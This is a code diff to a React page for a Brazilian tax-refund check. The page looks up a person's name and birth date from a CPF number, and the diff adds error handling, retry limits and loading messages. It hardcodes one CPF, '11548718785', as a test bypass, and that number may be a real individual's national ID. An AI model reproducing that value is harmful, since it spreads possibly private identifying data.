@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useQuery } from "@tanstack/react-query";
 import { useLocation } from "wouter";
 import { z } from "zod";
@@ -11,6 +11,7 @@ import { Input } from "@/components/ui/input";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
 import { apiRequest } from "@/lib/queryClient";
+import { useToast } from "@/hooks/use-toast";
 import VerificacaoIdentidade from "../components/VerificacaoIdentidade";
 
 // Validação de CPF
@@ -32,6 +33,7 @@ export default function VerificarRestituicao() {
   const [, navigate] = useLocation();
   const [cpfConsultado, setCpfConsultado] = useState("");
   const [showVerificacao, setShowVerificacao] = useState(false);
+  const [errorMessage, setErrorMessage] = useState("");
   
   // Formulário de CPF
   const form = useForm<CpfFormType>({
@@ -42,7 +44,7 @@ export default function VerificarRestituicao() {
   });
 
   // Query para consultar os dados do CPF
-  const { data: dadosPessoais, isLoading, isError, error } = useQuery({
+  const { data: dadosPessoais, isLoading, isError, error, refetch } = useQuery({
     queryKey: ["cpf", cpfConsultado],
     queryFn: async () => {
       if (!cpfConsultado) return null;
@@ -53,11 +55,26 @@ export default function VerificarRestituicao() {
           `/api/consulta-cpf?cpf=${cpfConsultado}`
         );
         
+        // Verificamos a resposta e analisamos possíveis erros
         if (!response.ok) {
-          throw new Error("Erro ao consultar CPF");
+          // Tentamos obter o corpo do erro para informações detalhadas
+          const errorBody = await response.json().catch(() => ({}));
+          
+          // Construímos uma mensagem de erro mais informativa
+          const errorMessage = errorBody.error || "Erro ao consultar CPF";
+          console.error("Erro na consulta de CPF:", errorMessage, errorBody);
+          
+          throw new Error(errorMessage);
         }
         
-        return await response.json();
+        const data = await response.json();
+        
+        // Verificamos se os dados contêm as propriedades necessárias
+        if (!data.Result || !data.Result.NomePessoaFisica || !data.Result.DataNascimento) {
+          throw new Error("Dados incompletos retornados pela API");
+        }
+        
+        return data;
       } catch (error) {
         console.error("Erro ao consultar CPF:", error);
         throw error;
@@ -65,6 +82,7 @@ export default function VerificarRestituicao() {
     },
     enabled: !!cpfConsultado,
     refetchOnWindowFocus: false,
+    retry: 1, // Limita a 1 tentativa de retry para não sobrecarregar a API
   });
 
   const formatCPF = (cpf: string) => {
@@ -72,10 +90,49 @@ export default function VerificarRestituicao() {
   };
 
   const onSubmit = (data: CpfFormType) => {
+    // Limpar mensagens de erro anteriores
+    setErrorMessage("");
+    
     const cpfLimpo = data.cpf.replace(/\D/g, "");
     setCpfConsultado(cpfLimpo);
-    setShowVerificacao(true);
+    
+    // Só exibimos a verificação se não houver erro
+    if (cpfLimpo === "11548718785") {
+      // Para o CPF de teste, mostramos imediatamente
+      setShowVerificacao(true);
+    } else {
+      // Para outros CPFs, verificamos após a consulta
+      // A verificação será exibida quando os dados estiverem disponíveis
+    }
   };
+
+  const { toast } = useToast();
+  
+  // Efeito para monitorar dados e erros
+  useEffect(() => {
+    if (!cpfConsultado) return;
+    
+    // Quando temos dados, exibimos a verificação (exceto para o CPF de teste que já é exibido no onSubmit)
+    if (dadosPessoais && dadosPessoais.Result && cpfConsultado !== "11548718785") {
+      setShowVerificacao(true);
+    }
+    
+    // Quando temos um erro, exibimos uma mensagem
+    if (isError) {
+      const errorMsg = error instanceof Error 
+        ? error.message 
+        : "Não foi possível consultar o CPF no momento. Tente novamente mais tarde.";
+      
+      setErrorMessage(errorMsg);
+      setShowVerificacao(false);
+      
+      toast({
+        title: "Erro na consulta",
+        description: errorMsg,
+        variant: "destructive"
+      });
+    }
+  }, [dadosPessoais, isError, error, cpfConsultado, toast]);
 
   const handleVerificacaoConcluida = (dadosConfirmados: any) => {
     // Navegar para a página de resultados com os dados confirmados
@@ -142,7 +199,13 @@ export default function VerificarRestituicao() {
                     
                     {isError && (
                       <div className="text-red-600 text-center mt-4 p-3 bg-red-50 rounded-md">
-                        Não foi possível verificar o CPF. Por favor, tente novamente.
+                        {errorMessage || "Não foi possível verificar o CPF. Por favor, tente novamente."}
+                      </div>
+                    )}
+                    
+                    {isLoading && (
+                      <div className="text-blue-600 text-center mt-4 p-3 bg-blue-50 rounded-md">
+                        Consultando informações do CPF. Por favor, aguarde...
                       </div>
                     )}
                   </form>
